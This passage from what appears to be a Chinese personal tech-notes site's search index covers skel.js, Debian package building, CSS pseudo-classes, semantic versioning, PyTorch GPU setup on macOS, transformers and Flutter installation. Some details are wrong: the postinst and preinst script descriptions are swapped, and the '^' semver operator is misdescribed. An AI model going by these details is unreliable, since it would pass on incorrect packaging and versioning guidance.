is ready!\" ); }); load 当 页面加载完成时调用\n.. Triggered when the page loads. skel . on ( \"load\" , function () { alert ( \"Page has finished loading!\" ); }); +breakpointName 当 breakpointName 变为激活状态时调用.\n.. Triggered when breakpointName becomes active. For example: skel . on ( \"+small\" , function () { /* Turn on feature for small displays */ }); -breakpointName 当 breakpointName 变为非激活状态时调用\n.. Triggered when breakpointName becomes inactive. For example: skel . on ( \"-small\" , function () { /* Turn off feature for small displays */ }); !breakpointName 如果 breakpointName 在调用 skel. breakpoints() 的时刻未激活，则触发\n.. Triggered if breakpointName is not active at the exact moment you call skel.breakpoints(). For example: skel . on ( \"!small\" , function () { /* Turn on feature for non-small displays */ }); 变量(Vars) 可以通过 skel.vars 暴露浏览器/系统的静态信息.\n支持的信息属性. browser: string 客户端浏览器, 定义的值\n.. Client's browser, which can be any of the following: 浏览器 对应值 Firefox firefox Chrome chrome Safari safari Opera opera Internet Explorer ie Edge edge BlackBerry bb Other other browserVersion: float 客户端浏览器版本 IEVersion: float 如果客户端用的是 IE, 则会设置成对应的版本号(如. 8 ~ IE8, 11 ~ IE11).\n如果不是, 值就是 99.\n如果想仅在IE对应版本下做某些操作, 这样写\n.. If the client is using any version of IE,\nthis will be set to its version number (eg. 8 for IE8, 11 for IE11).\nHowever, if they're using anything other than IE,\nthis will be set to 99, effectively reducing legacy IE checks to a single condition. For example: if ( skel . vars . IEVersion < 9 ) { /* This will only execute if the client's using IE AND its version is <9 */ } os: string 客户端操作系统\n.. Client's operating system, which can be any of the following: 操作系统 对应值 Android android iOS ios Windows Phone wp Mac OS X mac Windows windows BlackBerry bb Other other osVersion: float 客户端操作系统\n.. Client's operating system version. touch: bool 客户端设备是否支持触摸操作. (true 值并不意味着没有鼠标和键盘。)\n.. Set to true if the client is using a device with a touchscreen, or false if not.\nNote: A value of true does not imply the abscence of a mouse and keyboard. mobile: bool 客户端是否是移动操作系统(手机比如iOS, Android,  Windows Phone, BlackBerry).\n.. Set to true if the client is using what's considered a \"mobile OS\" (currently iOS, Android, Windows Phone, and BlackBerry), or false if not. Equivalent to:: 等价于 ( skel . vars . os == \"wp\" || skel . vars . os == \"android\" || skel . vars . os == \"ios\" || skel . vars . os == \"bb\" ) stateId: string 当前状态ID. 状态是 breakpoints 的特定组合. 状态ID是用于在内部引用该状态的唯一标识符.\n.. Current state ID. A state, in Skel terms, is a specific combination of active breakpoints,\n.. and a state ID is the unique identifier used to reference that state internally.\n.. For example, given the breakpoints medium, small, and xsmall (defined in that exact order): Active Breakpoints Value of stateId medium /medium small /small small and xsmall /small/xsmall (none) / stateId主要用于Skel自己的内部使用，\n也可以在其他地方派上用场（例如，当 特定的断点组合处于 活动状态 时 执行操作）。\n.. While stateId is primarily meant for Skel's own internal use,\n.. it can come in handy elsewhere (eg. to perform an action when a very specific combination of breakpoints is active). lastStateId: string 最后一次状态变化之前的 stateId , 如果没变化过为 null .. The value of stateId before the last state change, or null if the state hasn't changed yet. 其他: 骨架屏优化: 前端性能优化必杀技：骨架屏让你快人一步","tags":"前端","url":"/yq-docs-front-end-frame-skel.html","loc":"/yq-docs-front-end-frame-skel.html"},{"title":"skelJS","text":"相关资源: skelJS仓库: https://github.com/andreipetcu/skelJS.git , 基于 skel 的某一个master的fork. 基本与 skel 一致","tags":"前端","url":"/yq-docs-front-end-frame-skelJS.html","loc":"/yq-docs-front-end-frame-skelJS.html"},{"title":"本地构建deb包","text":"关键词:: deb包构建 Debian 安装包 Ubuntu 安装包 相关资源: debian官方文档: https://www.debian.org/releases/stable/amd64/index.zh-cn.html control文件说明: https://www.debian.org/doc/debian-policy/ch-controlfields.html 文件结构 DEBIAN 下的这些文件, 安装后一般都可以在 /var/lib/info 下找到,\n如 /var/lib/info/xxx.prerm* 大概包目录结构如下: |----DEBIAN\n      |-------control\n      |-------postinst(postinstallation)\n      |-------postrm(postremove)\n      |-------preinst(preinstallation)\n      |-------prerm(preremove)\n      |-------copyright(版权)\n      |-------changlog(修订记录)\n      |-------conffiles\n|----etc\n|----usr\n|----opt\n|----tmp\n|----boot\n      |-----initrd-vstools.img DEBIAN 下的文件大多都需要可执行权限 control文件 官方字段说明见: https://www.debian.org/doc/debian-policy/ch-controlfields.html deb包必须具备的描述性文件，以便于软件的安装管理和索引 内容字段说明 Package 程序名称 中间不能有空格 Version 版本 Section 软件类别 utils, net, mail, text, x11 Priority 软件对于系统的重要程度 required, standard, optional, extra等 Essential 是否是系统最基本的软件包 yes/no，若为yes,则不允许卸载（除非强制性卸载） Architecture 软件所支持的平台架构 all, i386, amd64, m68k, sparc, alpha, powerpc等,\n支持的架构可参考: https://www.debian.org/releases/stable/amd64/ch02s01.zh-cn.html Source 软件包的源代码名称 Depends 软件所依赖的其他软件包和库文件 若依赖多个软件包和库文件，采用逗号隔开 Pre-Depends 软件安装前必须安装、配置依赖性的软件包和库文件 常用于必须的预运行脚本需求 Recommends 推荐安装的其他软件包和库文件 Suggests 建议安装的其他软件包和库文件 Maintainer 维护者 Description 程序说明 Homepage 主页 Installed-Size: 安装大概消耗的空间(预估值, 实际可能有所不同), 只写数字即可, 单位字节 Download-Size: 大小需要下载的包的大小, 只写数字大小即可, 单位字节 MimeType: 关联的文件类型, 比如vscode设置了 inode/directory 就可以右键选择其他应用打开的时候有vscode MimeType支持的部分类型: inode/directory：普通文件夹 text/plain: 文本文件 application/x-gnome-saved-search：GNOME 桌面环境中保存的搜索结果文件夹 inode/mount-point：挂载点，表示一个已挂载的设备或文件系统 inode/blockdevice：块设备文件夹 inode/chardevice：字符设备文件夹 inode/socket：套接字文件夹 inode/fifo：命名管道文件夹 application/Xcode-workspace: xcode项目, 主要是苹果下面的 postinst文件 在Deb包文件解包之前（即软件安装前），将会运行该脚本。可以停止作用于待升级软件包的服务，直到软件包安装或升级完成。 preinst文件 负责完成安装包时的配置工作。如新安装或升级的软件重启服务。软件安装完后，执行该Shell脚本，一般用来配置软件执行环境，必须以\"#!/bin/sh\"为首行。 prerm文件 该脚本负责停止与软件包相关联的daemon服务。它在删除软件包关联文件之前执行 postrm文件 负责修改软件包链接或文件关联，或删除由它创建的文件。软件卸载后，执行该Shell脚本，一般作为清理收尾工作，必须以\"#!/bin/sh\"为首行 copy-right changlog文件 conffiles文件 用例 大概目录结构: .dist/deb_ev-deb/\n|-- DEBIAN\n|   `-- control\n|   `-- postinit\n`-- usr\n    |-- local\n    |   `-- life\n    |       `-- ev-deb-1.0.1\n    |           `-- main.bin\n    `-- share\n        |-- applications\n        |   `-- life\n        |       `-- ev-deb.desktop\n        `-- icons\n            `-- life\n              `-- ic.png 其中: DEBIAN/control 是包相关信息, 必有.\n配置内容大概: Package: ev-deb\nVersion: 1.0.1\nArchitecture: amd64\nMaintainer: yq\nDescription: desc a every deb DEBIAN/control 这里用来做桌面图标设置相关脚本, 有GUI界面才需要设置\n内容: #!/bin/bash\ncp /usr/share/applications/life/ev-deb.desktop ~/Desktop 其他的比如 usr 是模仿linux系统结构来进行布局, 比如这里的是 usr/local/life/ev-deb-1.0.1 ,\n那么实际的安装位置就是 /usr/local/life/ev-deb-1.0.1 . usr/share/applications/life/ev-deb.desktop , 主要是需要在 /usr/share/applications 创建一个 .desktop 文件, 以便于在 GUI 界面的时候可以在桌面活着任务栏看到, 若是GUI应用必有. 配置内容大概: [Desktop Entry]\nName=ev-deb\nComment=desc a every deb\nExec=.dist/deb_ev-deb/ev-deb-1.0.1/main.bin\nIcon=.dist/deb_ev-deb/usr/share/icons/life/ic.png\nTerminal=true\nType=Application\nX-Ubuntu-Touch=true\nCategories=Development 且必有可执行权限. Name 表示在桌面上显示的名称 usr/share/icons , 图标位置, GUI界面必有, 用于 .desktop 文件.\n特别说明, Exec字段指定的路径如果有空格, 可以用引号代替 Icon字段指定的图标路径不能有引号与空格, 否则 dpkg -b 打包的时候校验不通过(但是实际安装好后可以用空格, 不能用引号). 注解 usr/share/applications/ 下是系统的启动器默认的应用(桌面文件)存放位置,\n若放在其他位置如 ~/.local/share/applications/ , 可使用指令更新: update-desktop-database ~/.local/share/applications/ 这样就不需要手动 右键 - 允许启动 了 官方文档建议的打包工具 debmake: deb目录结构生成工具 (好像需要手动装) debbuild: 根据上一步构建好的结构, 生成包, 与 dpkg -b 类似, 不过 dpkg 更底层. debbuild 读取软件包的源代码目录中的 debian/rules` 文件来执行构建过程，\n并自动处理构建过程中的许多步骤，例如配置、编译和安装. debuild 还会检查构建依赖关系并确保它们已满足，以及生成符合 Debian 软件包规范的二进制和源代码软件包. dpkg -b 是一个更底层的工具，用于将已经构建好的二进制文件打包成一个 Debian 格式的软件包.\n它不会自动执行构建过程，而是需要手动提供已经构建好的文件和必要的控制信息（例如包名、版本号、依赖关系等）. dpkg -b 的优点是灵活性，允许用户手动控制软件包的构建流程和细节. deb包配置右键单击支持使用其他应用打开 只需配置 desktop 文件, 如上面的 usr/share/applications/life/ev-deb.desktop 还是用上面的例子: [Desktop Entry]\nName=ev-deb\nComment=desc a every deb\nExec=.dist/deb_ev-deb/ev-deb-1.0.1/main.bin\nIcon=.dist/deb_ev-deb/usr/share/icons/life/ic.png\nTerminal=true\nType=Application\nX-Ubuntu-Touch=true\nCategories=Development 有两个地方要改, 一个是Exec改为需要增加参数 Exec=.dist/deb_ev-deb/ev-deb-1.0.1/main.bin %F 部分支持的参数: %F: 选中文件夹或文件的路径 %U: 选中文件夹的路径 另一个是增加 `MimeType` , 与 control文件 的 MimeType 一致,\n需要说明的是, 即使已经在 control文件 写了 MimeType ,\n还是得在 desktop 文件再写一次(多个用分号隔开), 两个地方的不共享.\n表示哪些类型的文件可以右键选择用此应用打开.\n比如: MimeType=text/plain;inode/directory;application/x-code-workspace; 重要 当 Exec 使用了额外参数, 注意开发应用要对其值可能为空字符串进行处理.\n此前因为没处理空字符串导致的bug, 找了几天.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Build-a-local-bucket.html","loc":"/yq-docs-operating-system-linux-Tutorial-Build-a-local-bucket.html"},{"title":"CSS伪类","text":"概念说明见: 各种选择器 常见的 :active 元素激活. 比如按钮被点击, input选中 :hover 鼠标移入元素. 或者说当鼠标悬停在元素上时应用的样式 :before 在元素渲染之前增加内容 :after 在元素渲染之后增加内容 :focus 当元素获得焦点（例如通过键盘导航）时应用的样式。 :visited 表示已访问过的链接的样式。 :link 表示未访问的链接的样式。 :only-child 表示在当前代中, 只有自己一个元素, 没有其他兄弟节点. (没有括号跟参数) 比如 < div class = \"father1\" > < div class = \"son1\" ></ div > </ div > < div class = \"father2\" > < div class = \"son1\" ></ div > < div class = \"son1\" ></ div > </ div > 中, 使用 son1:only-child 可以选择到 father1 的 son1 元素,\n无法选择到 father2 的 son1 元素`. :first-child 选择作为其父元素的第一个子元素的元素。 :last-child 选择作为其父元素的最后一个子元素的元素。 :nth-child(n) 选择作为其父元素的第 n 个子元素的元素。其中 n 可以是一个具体的数字、关键字（如 even、odd）或表达式（如 2n+1）。 当 n 是一个数字时,它表示第 n 个子元素。例如 button:nth-child(3) 会选择父元素的第 3 个子元素,且这个子元素必须是 button 标签。 当 n 是一个表达式时,它可以使用关键词 odd 和 even 来选择奇数或偶数位置的子元素。例如 button:nth-child(odd) 会选择所有位于奇数位置的 button 子元素。 :nth-of-type(n) 选择作为其父元素中特定类型的第 n 个子元素的元素。 :nth-last-child(n) 选择作为其父元素的倒数第 n 个子元素的元素。 :nth-last-of-type(n) 选择作为其父元素中特定类型的倒数第 n 个子元素的元素。 :disabled 匹配被禁用的元素，例如 <input>、<button> 等。可以用于样式化禁用状态下的元素。 :enabled 匹配启用的元素，与 :disabled 相反。可以用于样式化启用状态下的元素。 :not() 表示对某一种选择器取反, 如选择未被禁用的button: button:not(:disabled) 现有css类属性a,b,c; a下包含b和c, b下包含c 如何写css选择器, 选择 a下的 不属于b 的c: .a .c:not(.b .c) :has() 表示选择包含特定选择器的元素. 比如 . a : has ( . b ) { color : red ; } 表示选择包含 类b 的 类a 元素, html中可以是这样 < div class = \"a\" > < div class = \"b\" > </ div > </ div > :root 用于选择文档的根元素，即 <html> 元素。 :root 选择器通常用于设置全局的 CSS 变量（CSS variables），也称为自定义属性（custom properties）,\n用于在整个文档中访问和使用这些变量。这样，可以实现全局的样式设置和主题切换等功能。 示例 : root { --primary-color : #ff0000 ; --font-size : 16 px ; } body { color : var ( --primary-color ); font-size : var ( --font-size ); }","tags":"前端","url":"/yq-docs-front-end-CSS-Pseudo--category.html","loc":"/yq-docs-front-end-CSS-Pseudo--category.html"},{"title":"语义化版本","text":"比较流行的一个版本定义约束 语义化版本规则 版本格式: 主版本号.次版本号.修订号 版本号递增规则如下： 主版本号 major ：当你做了不兼容的 API 修改, 次版本号 minor ：当你做了向下兼容的功能性新增, 修订号 patch ：当你做了向下兼容的问题修正。 版本一般都是从 0.1.0 开始 语义化版本符号 比较时，可以使用以下比较符号: =\n  等于。用于指定必须匹配的确切版本号。\n  例如：1.0.0 等于 1.0.0。\n\n>\n  大于。用于指定必须匹配的更高版本号。\n  例如：1.0.0 大于 0.9.9。\n\n>=\n  大于或等于。用于指定必须匹配的更高或相同的版本号。\n  例如：1.0.0 大于或等于 1.0.0。\n\n<\n  小于。用于指定必须匹配的更低版本号。\n  例如：1.0.0 小于 1.1.0。\n\n<=\n  小于或等于。用于指定必须匹配的更低或相同的版本号。\n  例如：1.0.0 小于或等于 1.0.0。\n\n~\n  约等于。用于指定与指定版本兼容的更新版本号，通常用于次版本号的更新。\n  例如：~1.2.3 匹配 1.2.x 的任何版本，但不匹配 1.3.0。\n\n&#94;\n  向上兼容。用于指定与指定版本兼容的更新版本号，但更严格，通常用于主版本号的更新。\n  例如：&#94;1.2.3 匹配 1.x.x 的任何版本，但不匹配 2.0.0。\n\n*\n  通配符。用于指定任何版本。\n  例如：* 匹配任何版本号。\n\n|| 或 &#94;\n  用于范围选择，可以指定一个版本范围。\n  例如：1.2.3 || 2.0.0 匹配 1.2.3 或 2.0.0。\n  例如：&#94;1.2.3 也可以用来表示 >=1.2.3 <2.0.0。\n\n-\n  指定一个版本号范围。\n  例如：1.0.0 - 2.0.0 多个版本共同作用可以用空格分开, 如: >1.1.0 <2.2.0","tags":"杂乱无章","url":"/yq-docs-Chaotic-lan-edition.html","loc":"/yq-docs-Chaotic-lan-edition.html"},{"title":"Mac下使用GPU加速","text":"现在这个时间点, AI已经火的遍地开花.\n曾经的看不上也变成了切身相关... 此文参考 Apple官方教程: https://developer.apple.com/metal/pytorch/ 支持的系统: MacOS M 系列 (比如 MacBook Pro 2021) MacOS Intel + AMD 系列 (比如 MacBook Pro 2019-16inch) 注解 此前在社区看到有M系列支持GPU加速的教程,\n以为只有 M 系列支持,\n后来查文档才发现 MacOS 的 AMD 系列也支持. 知识因为, 是比较老的版本了, 所以基本没人提. 安装 方案一: 使用pip安装 建议先创建个虚拟环境再安装 # 如果之前已经用原版装过, 要先卸载: pip uninstall torch torchvision torchaudio pip3 install --pre torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/nightly/cpu 如果遇到报错: pip._vendor.urllib3.exceptions.ReadTimeoutError: HTTPSConnectionPool(host='download.pytorch.org', port=443): Read timed out. 说明网络有问题, 如果用了梯子, 先把梯子关掉再执行: (.venv) yq@local FromDiffusers % pip3 install --pre torch torchvision torchaudio --index-url https://download.pytorch.org/whl/nightly/cpu\nLooking in indexes: https://download.pytorch.org/whl/nightly/cpu\nCollecting torch\n  Downloading https://download.pytorch.org/whl/nightly/cpu/torch-2.3.0.dev20240311-cp311-none-macosx_10_9_x86_64.whl (153.3 MB)\n    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 153.3/153.3 MB 10.1 MB/s eta 0:00:00\nCollecting torchvision\n  Downloading https://download.pytorch.org/whl/nightly/cpu/torchvision-0.18.0.dev20240227-cp311-cp311-macosx_10_13_x86_64.whl (1.8 MB)\n    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.8/1.8 MB 8.6 MB/s eta 0:00:00\nCollecting torchaudio\n  Downloading https://download.pytorch.org/whl/nightly/cpu/torchaudio-2.2.0.dev20240227-cp311-cp311-macosx_10_13_x86_64.whl (3.4 MB)\n    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 3.4/3.4 MB 10.2 MB/s eta 0:00:00\nRequirement already satisfied: filelock in ./.venv/lib/python3.11/site-packages (from torch) (3.13.3)\nRequirement already satisfied: typing-extensions>=4.8.0 in ./.venv/lib/python3.11/site-packages (from torch) (4.10.0)\nRequirement already satisfied: sympy in ./.venv/lib/python3.11/site-packages (from torch) (1.12)\nRequirement already satisfied: networkx in ./.venv/lib/python3.11/site-packages (from torch) (3.2.1)\nRequirement already satisfied: jinja2 in ./.venv/lib/python3.11/site-packages (from torch) (3.1.3)\nRequirement already satisfied: fsspec in ./.venv/lib/python3.11/site-packages (from torch) (2024.3.1)\nRequirement already satisfied: numpy in ./.venv/lib/python3.11/site-packages (from torchvision) (1.26.4)\nCollecting torch\n  Downloading https://download.pytorch.org/whl/nightly/cpu/torch-2.3.0.dev20240227-cp311-none-macosx_10_9_x86_64.whl (152.5 MB)\n    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 152.5/152.5 MB 15.1 MB/s eta 0:00:00\nRequirement already satisfied: pillow!=8.3.*,>=5.3.0 in ./.venv/lib/python3.11/site-packages (from torchvision) (10.3.0)\nRequirement already satisfied: MarkupSafe>=2.0 in ./.venv/lib/python3.11/site-packages (from jinja2->torch) (2.1.5)\nRequirement already satisfied: mpmath>=0.19 in ./.venv/lib/python3.11/site-packages (from sympy->torch) (1.3.0)\nInstalling collected packages: torch, torchvision, torchaudio\nSuccessfully installed torch-2.3.0.dev20240227 torchaudio-2.2.0.dev20240227 torchvision-0.18.0.dev20240227 方案二: 使用 conda 安装 conda install pytorch torchvision torchaudio -c pytorch-nightly 方案三: 从源码构建 系统工具要求: Xcode 13.3.1 or later. 配置环境变量: USE_MPS=1 USE_MPS 表示构建时, 使用 MPS 构建. 然后去 https://github.com/pytorch/pytorch#from-source 拉源码手动构建.\n构建方式也参考仓库说明 验证 import torch if torch . backends . mps . is_available (): mps_device = torch . device ( \"mps\" ) x = torch . ones ( 1 , device = mps_device ) print ( x ) else : print ( \"MPS device not found.\" ) 输出: tensor([1.], device='mps:0')","tags":"AI","url":"/yq-docs-AI-Deep-learning-tutorial-mac-gpu.html","loc":"/yq-docs-AI-Deep-learning-tutorial-mac-gpu.html"},{"title":"transformers","text":"transformers 包又名 pytorch-transformers 或者 pytorch-pretrained-ber ,\n提供了数以千计的预训练模型(即已经训练好的模型). 实际效果就是, 指定好模型名称, 调用的时候才触发模型下载, 一般下载到缓存后,\n以后再次使用同名模型就不用再次下载了. 简单来说, transformers 包是一个代理层, 使用它来直接 加载已有的训练好的模型(需要 `transformers` 包有),\n并使用常规的一些方式对模型进行微调 . 注解 反之, 如果你想从头训练一个模型, 那么就没必要使用这个库了 相关资源 pypi地址: https://pypi.org/project/transformers/ github地址: https://github.com/huggingface/transformers/tree/main 安装 pip install transformers 举例 以官方仓库的例子说明. 快速使用流水线去判断正负面情绪 >>> from transformers import pipeline # 使用情绪分析流水线 >>> classifier = pipeline ( 'sentiment-analysis' ) >>> classifier ( 'We are very happy to introduce pipeline to the transformers repository.' ) [{ 'label' : 'POSITIVE' , 'score' : 0.9996980428695679 }] 第二行代码 下载并缓存 了流水线使用的预训练模型，而第三行代码则在给定的文本上进行了评估。\n这里的答案\"正面\" (positive) 具有 99 的置信度。 许多的 NLP 任务都有开箱即用的预训练流水线。比如说，我们可以轻松的从给定文本中抽取问题答案 >>> from transformers import pipeline # 使用问答流水线 >>> question_answerer = pipeline ( 'question-answering' ) >>> question_answerer ({ ... 'question' : 'What is the name of the repository ?' , ... 'context' : 'Pipeline has been included in the huggingface/transformers repository' ... }) { 'score' : 0.30970096588134766 , 'start' : 34 , 'end' : 58 , 'answer' : 'huggingface/transformers' } 除了给出答案，预训练模型还给出了对应的置信度分数、答案在词符化 (tokenized) 后的文本中开始和结束的位置。你可以从这个教程了解更多流水线API支持的任务。 要在你的任务上下载和使用任意预训练模型也很简单，只需三行代码。这里是 PyTorch 版的示例： >>> from transformers import AutoTokenizer , AutoModel >>> tokenizer = AutoTokenizer . from_pretrained ( \"google-bert/bert-base-uncased\" ) >>> model = AutoModel . from_pretrained ( \"google-bert/bert-base-uncased\" ) >>> inputs = tokenizer ( \"Hello world!\" , return_tensors = \"pt\" ) >>> outputs = model ( ** inputs ) 这里是等效的 TensorFlow 代码： >>> from transformers import AutoTokenizer , TFAutoModel >>> tokenizer = AutoTokenizer . from_pretrained ( \"google-bert/bert-base-uncased\" ) >>> model = TFAutoModel . from_pretrained ( \"google-bert/bert-base-uncased\" ) >>> inputs = tokenizer ( \"Hello world!\" , return_tensors = \"tf\" ) >>> outputs = model ( ** inputs ) 词符化器 (tokenizer) 为所有的预训练模型提供了预处理，并可以直接对单个字符串进行调用（比如上面的例子）或对列表 (list) 调用。\n它会输出一个你可以在下游代码里使用或直接通过 ** 解包表达式传给模型的词典 (dict)。 模型本身是一个常规的 Pytorch nn.Module 或 TensorFlow tf.keras.Model`（取决于你的后端），可以常规方式使用。\n这个教程解释了如何将这样的模型整合到经典的 `PyTorch 或 TensorFlow 训练循环中，或是如何使用我们的 Trainer 训练器）API 来在一个新的数据集上快速微调。 支持的模型 参考官方文档: model_summary API transformers.pipeline 从缓存加载模型, 如果没有就先下载","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-transformers.html","loc":"/yq-docs-rear-end-python-python-three--party-library-transformers.html"},{"title":"Flutter","text":"Flutter 框架 Flutter 是一个开源的 UI 工具包，由 Google 开发，用于创建跨平台的原生应用程序。它使用 Dart 语言作为开发语言。 Flutter 提供了一套丰富的基础组件和强大的 UI 创建能力，允许开发者以一种声明式的方式构建应用程序的用户界面。 通过 Flutter，开发者可以编写一次代码，然后编译到本地代码，运行在 iOS、Android、web 以及桌面等多个平台上。 安装 MacOS 在 MacOS 下, 安装 Flutter 后, 可以从输出看到, dart 已经默认被捆绑安装 brew install --cask flutter # 下面是输出 Running ` brew update --auto-update ` ... == > Auto-updated Homebrew!\nUpdated 2 taps ( homebrew/core and homebrew/cask ) . == > New Formulae\nc-blosc2 dissent ingress2gateway jnv protoc-gen-js ratchet rtabmap == > New Casks\ngalaxybudsclient godspeed ireal-pro irpf2024 juxtacode lookaway loungy xcodepilot\n\nYou have 91 outdated formulae and 1 outdated cask installed. == > Downloading https://raw.githubusercontent.com/Homebrew/homebrew-cask/2e01faa0b7127d4da8febacd0448062c147386af/Casks/f/flutter.rb ###################################################################################################################################################################### 100.0% == > Downloading https://storage.googleapis.com/flutter_infra_release/releases/stable/macos/flutter_macos_3.19.5-stable.zip ###################################################################################################################################################################### 100.0% == > Installing Cask flutter == > Linking Binary 'dart' to '/usr/local/bin/dart' == > Linking Binary 'flutter' to '/usr/local/bin/flutter' 🍺 flutter was successfully installed! 最后几行输出已说明 补充, 当你从 Flutter 官网下载并安装 Flutter SDK 后，你将获得以下内容： Dart 运行时：这是执行 Dart 代码所需的环境。 Flutter 框架：包含了构建用户界面所需的所有核心库和组件。 命令行工具：如 flutter 命令行接口，它提供了创建项目、构建和运行应用程序等功能。 编辑器和 IDE 支持：Flutter 插件和支持，以便在流行的代码编辑器和集成开发环境中使用。 因此，如果你的目的是开发 Flutter 应用程序，你不需要单独安装 Dart。\n只需按照 Flutter 官方安装指南进行操作，即可同时获得 Dart 语言环境和 Flutter 框架。 注解 此处的介绍仅自己摸索, 因为刚开始, 有些可能不完善.\n官方的教程说明是自己手动下载安装,\n详见: Start building Flutter native desktop apps on macOS 国内可以看这个官方推荐的中文教程(属于社区文档): 在中国网络环境下使用Flutter Windows 直接把仓库clone下来了 git clone --recursive https://github.com/flutter/flutter.git cd flutter && git checkout 3 .19.5 # 切换到最新版 vscode里面用的时候直接手动指定一下sdk包为clone的位置. 注解 拉下来的默认是主分支的, 可以手动切换到tag 记得可以直接把clone位置下的 bin 目录加到 PATH 环境变量. 因为是国内使用, 还需要给 flutter 配置使用时候的镜像源.\n可以在每次用的时候再手动设置以下镜像环境变量: PUB_HOSTED_URL=\"https://pub.flutter-io.cn\"\nFLUTTER_STORAGE_BASE_URL=\"https://storage.flutter-io.cn\" 也可以手动去系统环境变量加入 若需要完整的按照国内的教程使用, 详情参考 在中国网络环境下使用Flutter . Linux 设置镜像地址: export PUB_HOSTED_URL = \"https://pub.flutter-io.cn\" export FLUTTER_STORAGE_BASE_URL = \"https://storage.flutter-io.cn\" 其他与上面基本一致 这里简单给个使用curl直接下载指令 # 加上 tar 指令, 会将包直接解压文件夹 curl https://storage.flutter-io.cn/flutter_infra_release/releases/stable/linux/flutter_linux_3.19.5-stable.tar.xz | tar -xJ 然后记得设置下当前目录的环境变量或者软链接一下, 我是软链接的 # 软链接 ln -s flutter/bin/flutter /usr/local/bin/flutter\nln -s flutter/bin/dart /usr/local/bin/dart 记得测试一下, 看看还有哪些依赖需要安装当前却没有的, 比如可能会没有 cmake flutter doctor 比如我是新装的虚拟机, 需要额外的模块 sudo apt install clang cmake pkg-config ninja-build libgtk-3-dev 创建项目 参考: 3. 创建项目 此处仅介绍在 Vscode 中创建项目. Ctrl + Shift + P 打开命令面板, 输入 flutter . 选择 Flutter: New Project 注解 需要先安装 Flutter 插件 然后选择项目名称, 项目位置, 项目模板 创建好后, 你会发现下面有各个平台的文件夹, 不用去管这些平台文件夹. Flutter 开发, 是基于 Dart 语言的, 相关源码只用在 lib 文件夹下, main.dart 是入口文件.  默认输出到 build 文件夹下. 注解 用 lib 作为输出目录,\n有点奇葩, 一般貌似默认都叫 src ... 当第一次打开 lib/main.dart 时候, 可能会有报错: \"Target of URI doesn't exist: 'package:flutter/material.dart'. 说明是多半没把资源拉下来, 手动执行下 # flutter pub get     # 好像如果拉的别人的项目用这个? flutter packages get 配置文件介绍 pubspec.yaml pubspec.yaml 是主配置文件.\n在 dependencies 中添加依赖, dev_dependencies 中添加开发依赖. analysis_options.yaml 此文件决定了 Flutter 在分析代码时的严格程度(感觉就像tsconfig). 启动 报错1: 版本不匹配 如果遇到报错: lib/main.dart:1:1: Error: The specified language version is too high. The highest supported language version is 3.3. 可能是创建好后中途切过版本, 我是重新创建一个项目解决的. 或者 flutter clean 后重新加载(没试过) 报错2: \"dart:ui\" 不可用 错误信息: flutter/packages/flutter/lib/src/material/animated_icons.dart:9:8: Error: Dart library 'dart:ui' is not available on this platform. 原因: 直接将 lib/main.dart 当做普通的文件执行, 而不是作为 Flutter 项目启动. 解决 不要直接点 Vscode 右上角的三角形 Run 按钮, 而是去到 Debug -> Start Debugging 选项或直接按 F5 第一次点后会让你选择平台, 因为我用的 Windows 就选这个了 控件介绍 对于 Flutter 万物皆控件. Container: 容器, 类似div吧 Row: 行 Column: 列 Text: 文本 Image: 图片 Icon: 图标 ListView: 列表 GridView: 网格 Card: 卡片 Button: 按钮 TextField: 文本框 Switch: 开关 Checkbox: 复选框 Radio: 单选框 Slider: 滑动条 ProgressIndicator: 进度条 AppBar: 顶部栏 Expanded: 扩展, 每个 Expanded 代表一个区块，可以包含任何你想要的 Widget Expanded 布局组件. 使得布局能够自适应不同的屏幕尺寸和方向变化，同时简化了布局代码的编写 均匀分配空间： Expanded 会自动分配父容器中未使用的空间给它的子组件。这意味着如果有多个 Expanded 组件，它们会平分额外的空间。 响应式布局： 当父容器的大小变化时（例如，设备方向改变或键盘弹出）， Expanded 会响应这些变化并重新分配子组件的大小，保持布局的一致性和适应性。 简化布局代码： 使用 Expanded 可以减少手动计算和分配空间的需要，简化布局代码，使代码更加清晰和易于维护。 保持宽高比： 当 Expanded 用于 Row 或 Column 时，它可以保持子组件的宽高比，避免组件被拉伸或压缩。 Flexible 布局组件. 使得布局能够自适应不同的屏幕尺寸和方向变化，同时简化了布局代码的编写 灵活的空间分配： Flexible 提供了比 Expanded 更灵活的空间分配方式。通过 flex 属性，可以指定子组件占据的额外空间的比例。 优先级控制： Flexible 允许您通过 fit 属性（FlexFit.tight 或 FlexFit.loose）来控制子组件填充空间的优先级，从而实现更精细的布局控制。 嵌套使用： Flexible 可以嵌套使用，创建复杂的布局结构，同时保持子组件之间的空间分配比例。 与 Expanded 配合使用： Flexible 可以与 Expanded 配合使用，创建复杂的布局，其中一些子组件均匀分配空间，而其他子组件根据比例分配空间。 控件风格 Material  与 非 Material(Cupertino) 以下源于AI Material Design 设计理念：Material Design 是 Google 设计语言的一部分，它模仿了现实世界中的材料和光影效果，强调平面化、简洁和动态反馈。\n视觉元素：Material Design 使用扁平化的设计元素，如按钮、卡片、浮动操作按钮（FloatingActionButton）等，这些元素通常具有阴影效果，以模拟纸张的厚度和层次。\n交互反馈：Material Design 强调直观的交互反馈，如按钮按下时的阴影变化、滑动操作时的动态效果等。\n导航：Material Design 提供了多种导航模式，如底部导航栏（BottomNavigationBar）、标签导航（TabBar）和抽屉导航（Drawer）等。\n适用场景：Material Design 适用于需要现代化、简洁风格的应用，它在 Android 和 Web 应用中非常流行。 Cupertino（非 Material） 设计理念：Cupertino 设计风格是 Apple 的设计语言，它模仿了 iOS 的用户界面元素和交互模式，强调清晰、直观和一致性。\n视觉元素：Cupertino 风格使用更加立体的设计元素，如带有圆角的按钮、列表视图（ListView）和导航栏（NavigationBar）等，这些元素通常没有阴影效果，以模拟玻璃的质感。\n交互反馈：Cupertino 风格也提供了丰富的交互反馈，如按钮按下时的背景色变化、滑动列表时的弹性效果等。\n导航：Cupertino 风格提供了类似 iOS 的导航模式，如分段控件（SegmentedControl）、弹出菜单（ActionSheet）和模态弹出（Modal）等。\n适用场景：Cupertino 